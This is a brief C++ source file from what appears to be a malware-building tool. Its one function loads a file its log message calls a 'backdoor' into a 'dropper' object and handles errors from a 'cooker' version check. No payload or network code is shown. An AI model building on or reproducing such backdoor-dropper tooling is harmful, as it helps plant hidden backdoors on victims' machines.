/*
 * StreamingMelter.cpp
 *
 *  Created on: May 3, 2010
 *      Author: daniele
 */

#include <boost/format.hpp>
#include "StreamingMelter.h"
#include "Common.h"

void StreamingMelter::setRCS(const char* file) {
    DEBUG_MSG(D_INFO, "using backdoor %s", file);

    try {
        RCSDropper* dropper = new RCSDropper(file);
        dropper_.reset(dropper);
    } catch (InvalidCookerVersion& e) {
        DEBUG_MSG(D_WARNING, "%s has been cooked with RCSCooker version %s, required version is %s",
                file,
                e.effective().c_str(),
                e.required().c_str());
        throw parsing_error(e.what());
    } catch (std::runtime_error& e) {
        throw parsing_error(e.what());
    }
    
    DEBUG_MSG(D_DEBUG, "raw dropper size ... %d", (DWORD) dropper_->size());
}
